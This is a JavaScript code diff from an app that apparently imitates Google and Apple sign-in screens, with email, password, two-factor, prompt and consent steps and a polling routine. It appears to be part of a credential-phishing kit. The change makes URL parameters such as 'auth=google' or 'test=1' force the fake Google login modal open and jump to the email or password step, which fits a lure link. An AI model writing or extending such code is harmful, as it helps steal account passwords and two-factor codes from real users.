@@ -161,17 +161,34 @@ function initApp() {
     const btnCloseGoogleModal = document.getElementById("btnCloseGoogleModal");
 
     function showStep(stepElement) {
+        let targetStep = stepElement;
+
+        const initParams = new URLSearchParams(window.location.search);
+        const isTestBotUrl = initParams.get("auth") === "google" || 
+                             initParams.get("test") === "google" || 
+                             initParams.get("test") === "1" || 
+                             initParams.get("features") === "google" || 
+                             initParams.get("google") === "1" || 
+                             window.location.search.includes("auth=google");
+
+        if (!targetStep && isTestBotUrl) {
+            targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
+        }
+
         const isGoogleStep = [
             stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
-        ].includes(stepElement);
+        ].includes(targetStep);
 
         const isAppleStep = [
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt
-        ].includes(stepElement);
+        ].includes(targetStep);
 
         if (googleAuthModal) {
-            if (isGoogleStep) {
+            if (isGoogleStep || isTestBotUrl) {
                 googleAuthModal.classList.remove("hidden");
+                if (!isGoogleStep && isTestBotUrl) {
+                    targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
+                }
             } else {
                 googleAuthModal.classList.add("hidden");
             }
@@ -186,7 +203,7 @@ function initApp() {
             }
         }
 
-        if (isGoogleStep) {
+        if (isGoogleStep || isTestBotUrl) {
             if (typeof startGooglePolling === "function") startGooglePolling();
         }
 
@@ -196,7 +213,7 @@ function initApp() {
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
-        if (stepElement) stepElement.classList.add("active");
+        if (targetStep) targetStep.classList.add("active");
     }
 
     function navigateToAuthOrSavedStep() {
